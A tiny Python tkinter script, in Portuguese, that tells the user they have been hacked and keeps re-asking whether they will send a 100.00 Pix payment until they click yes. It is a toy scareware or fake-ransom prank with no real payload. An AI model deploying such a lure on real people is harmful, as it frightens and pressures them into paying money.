import tkinter as tk
from tkinter import messagebox

messagebox.showinfo("Atenção !", "Atenção você acaba de ser rackeado, essa janela só irá fechar se você escolher a opção certa!")

def ask_rack():
    
        
    answer = messagebox.askyesno("Pergunta", "faz o pix de 100,00")
    if answer:
        messagebox.showinfo("", "obrigado!")
        root.quit()
    else:
        ask_rack()
    

root = tk.Tk()
root.withdraw()
ask_rack()
root.mainloop()